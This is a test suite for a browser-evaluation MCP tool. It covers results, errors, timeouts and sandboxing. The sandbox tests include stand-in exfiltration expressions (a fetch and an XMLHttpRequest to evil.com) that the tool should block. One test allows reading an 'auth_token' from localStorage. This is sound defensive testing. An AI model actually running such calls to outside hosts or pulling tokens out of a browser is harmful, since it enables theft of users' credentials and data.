import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { createMcpTools } from "../../src/mcp-tools";
import { createEvent } from "../../src/event";
import { EventSource, EventLevel } from "../../src/types";

// ─── Helpers ─────────────────────────────────────────────────────────────────

type EventHandler = (event: ReturnType<typeof createEvent>) => void;

function makeEvalHub(
  options: {
    respondWithResult?: unknown;
    respondWithError?: string;
    delayMs?: number;
    neverRespond?: boolean;
  } = {},
) {
  const handlers: EventHandler[] = [];

  const hub = {
    getEvents: () => [],
    clearEvents: () => {},
    getInteractions: () => [],
    broadcastCommand: (cmd: unknown) => {
      if (options.neverRespond) return;

      const delay = options.delayMs ?? 20;
      setTimeout(() => {
        const hasExplicitResult = Object.prototype.hasOwnProperty.call(
          options,
          "respondWithResult",
        );
        const fakeEvalEvent = createEvent(
          "browser:dom" as EventSource,
          "info" as EventLevel,
          {
            evaluationId: (cmd as { evaluationId: string }).evaluationId,
            result: hasExplicitResult
              ? options.respondWithResult
              : "evaluation-result",
            ...(options.respondWithError
              ? { error: options.respondWithError, result: undefined }
              : {}),
          },
        );
        for (const h of handlers) h(fakeEvalEvent);
      }, delay);
    },
    onBrowserEvent: (handler: EventHandler) => {
      handlers.push(handler);
      return () => {
        const idx = handlers.indexOf(handler);
        if (idx !== -1) handlers.splice(idx, 1);
      };
    },
  } as unknown as ReturnType<typeof import("../../src/hub").createHub>;

  return hub;
}

// ─── evaluate_in_browser — happy path ────────────────────────────────────────

describe("evaluate_in_browser — successful evaluation", () => {
  it("returns the result from the extension", async () => {
    const hub = makeEvalHub({ respondWithResult: 42 });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({ expression: "1 + 1" });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.result).toBe(42);
  });

  it("result is returned within 500ms under normal conditions", async () => {
    const hub = makeEvalHub({ respondWithResult: "hello", delayMs: 30 });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const start = Date.now();
    await tool.handler({ expression: "document.title" });
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(500);
  });

  it("returns string results correctly", async () => {
    const hub = makeEvalHub({ respondWithResult: "Hello World" });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({ expression: "document.title" });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.result).toBe("Hello World");
  });

  it("returns object results correctly", async () => {
    const hub = makeEvalHub({
      respondWithResult: { width: 1920, height: 1080 },
    });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({
      expression: "({ width: window.innerWidth, height: window.innerHeight })",
    });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.result.width).toBe(1920);
    expect(parsed.result.height).toBe(1080);
  });

  it("returns null results correctly", async () => {
    const hub = makeEvalHub({ respondWithResult: null });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({
      expression: "document.querySelector('#does-not-exist')",
    });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.result).toBeNull();
  });

  it("uses unique evaluationId per call", async () => {
    const ids: string[] = [];
    const hub = {
      ...makeEvalHub({ respondWithResult: true }),
      broadcastCommand: (cmd: unknown) => {
        ids.push((cmd as { evaluationId: string }).evaluationId);
        // Don't respond — we just want to capture the IDs
      },
      onBrowserEvent: (_handler: EventHandler) => () => {},
    } as unknown as ReturnType<typeof import("../../src/hub").createHub>;

    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    // Fire two calls without awaiting (they'll timeout, we don't care)
    tool.handler({ expression: "1", timeout: 100 }).catch(() => {});
    tool.handler({ expression: "2", timeout: 100 }).catch(() => {});

    await new Promise((r) => setTimeout(r, 10));

    expect(ids.length).toBe(2);
    expect(ids[0]).not.toBe(ids[1]);
  });
});

// ─── evaluate_in_browser — error cases ───────────────────────────────────────

describe("evaluate_in_browser — error handling", () => {
  it("returns error when extension reports evaluation error", async () => {
    const hub = makeEvalHub({
      respondWithError: "ReferenceError: x is not defined",
    });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({ expression: "x" });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.error).toContain("ReferenceError");
  });

  it("returns timeout error when extension never responds", async () => {
    const hub = makeEvalHub({ neverRespond: true });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({
      expression: "longRunning()",
      timeout: 200,
    });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.error).toBeDefined();
    expect(parsed.error.toLowerCase()).toContain("timeout");
  }, 1000);

  it("empty expression returns error without broadcasting", async () => {
    let broadcasted = false;
    const hub = {
      ...makeEvalHub(),
      broadcastCommand: () => {
        broadcasted = true;
      },
      onBrowserEvent: (_h: EventHandler) => () => {},
    } as unknown as ReturnType<typeof import("../../src/hub").createHub>;

    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;
    const result = await tool.handler({ expression: "" });
    const parsed = JSON.parse(result.content[0].text);

    expect(parsed.error).toBeDefined();
    expect(broadcasted).toBe(false);
  });

  it("missing expression returns error", async () => {
    const hub = makeEvalHub({ neverRespond: true });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({});
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.error).toBeDefined();
  });

  it("timeout defaults to 3000ms when not specified", async () => {
    // This test verifies the timeout argument is parsed correctly.
    // We don't wait the full 3s — just verify the default is passed.
    const broadcastedCmds: unknown[] = [];
    const hub = {
      getEvents: () => [],
      clearEvents: () => {},
      getInteractions: () => [],
      broadcastCommand: (cmd: unknown) => broadcastedCmds.push(cmd),
      onBrowserEvent: (_h: EventHandler) => () => {},
    } as unknown as ReturnType<typeof import("../../src/hub").createHub>;

    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    // Start but don't await — we'll check the broadcast immediately
    const promise = tool.handler({ expression: "1+1" });
    await new Promise((r) => setTimeout(r, 10));

    expect(broadcastedCmds.length).toBe(1);
    // Cancel by letting it timeout
    await promise.catch(() => {});
  }, 500);
});

// ─── evaluate_in_browser — sandboxing ────────────────────────────────────────

describe("evaluate_in_browser — sandboxing", () => {
  it("rejects fetch() targeting non-localhost external URL", async () => {
    const hub = makeEvalHub({ neverRespond: true });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({
      expression: "fetch('https://evil.com/exfiltrate')",
    });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.error).toBeDefined();
    expect(parsed.error.toLowerCase()).toMatch(
      /sandbox|not allowed|blocked|rejected/,
    );
  });

  it("allows fetch() targeting localhost", async () => {
    const hub = makeEvalHub({ respondWithResult: { ok: true }, delayMs: 20 });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    // Should NOT be blocked — localhost fetch is allowed
    const result = await tool.handler({
      expression: "fetch('http://localhost:3000/api/health')",
    });
    const parsed = JSON.parse(result.content[0].text);
    // No sandbox error — either result or an error from the extension (not from sandbox)
    expect(parsed.error ?? "").not.toMatch(
      /sandbox|not allowed|blocked|rejected/,
    );
  });

  it("allows fetch() targeting 127.0.0.1", async () => {
    const hub = makeEvalHub({ respondWithResult: true, delayMs: 20 });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({
      expression: "fetch('http://127.0.0.1:5000/events')",
    });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.error ?? "").not.toMatch(
      /sandbox|not allowed|blocked|rejected/,
    );
  });

  it("rejects expressions containing XMLHttpRequest with external URL", async () => {
    const hub = makeEvalHub({ neverRespond: true });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({
      expression:
        "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://evil.com'); xhr.send()",
    });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.error).toBeDefined();
    expect(parsed.error.toLowerCase()).toMatch(
      /sandbox|not allowed|blocked|rejected/,
    );
  });

  it("allows DOM querying expressions", async () => {
    const hub = makeEvalHub({
      respondWithResult: "<div>Hello</div>",
      delayMs: 20,
    });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({
      expression: "document.querySelector('body').innerHTML",
    });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.error ?? "").not.toMatch(
      /sandbox|not allowed|blocked|rejected/,
    );
    expect(parsed.result).toBe("<div>Hello</div>");
  });

  it("allows localStorage access expressions", async () => {
    const hub = makeEvalHub({ respondWithResult: "token_abc", delayMs: 20 });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({
      expression: "localStorage.getItem('auth_token')",
    });
    const parsed = JSON.parse(result.content[0].text);
    expect(parsed.error ?? "").not.toMatch(
      /sandbox|not allowed|blocked|rejected/,
    );
  });
});

// ─── evaluate_in_browser — timeout configuration ─────────────────────────────

describe("evaluate_in_browser — timeout configuration", () => {
  it("respects custom timeout value", async () => {
    const hub = makeEvalHub({ neverRespond: true });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const start = Date.now();
    await tool.handler({ expression: "slow()", timeout: 300 });
    const elapsed = Date.now() - start;

    expect(elapsed).toBeGreaterThanOrEqual(280);
    expect(elapsed).toBeLessThan(800);
  }, 2000);

  it("caps timeout at 10000ms even if higher value passed", async () => {
    // We can't wait 10 seconds in a test — just verify the cap is applied
    // by checking that a high timeout value doesn't result in an immediate error
    // (i.e., it was accepted, not rejected)
    const hub = makeEvalHub({ respondWithResult: "ok", delayMs: 20 });
    const tool = createMcpTools(hub).find(
      (t) => t.name === "evaluate_in_browser",
    )!;

    const result = await tool.handler({ expression: "1", timeout: 99999 });
    const parsed = JSON.parse(result.content[0].text);
    // Should succeed (responded before any timeout)
    expect(parsed.result).toBe("ok");
  });
});
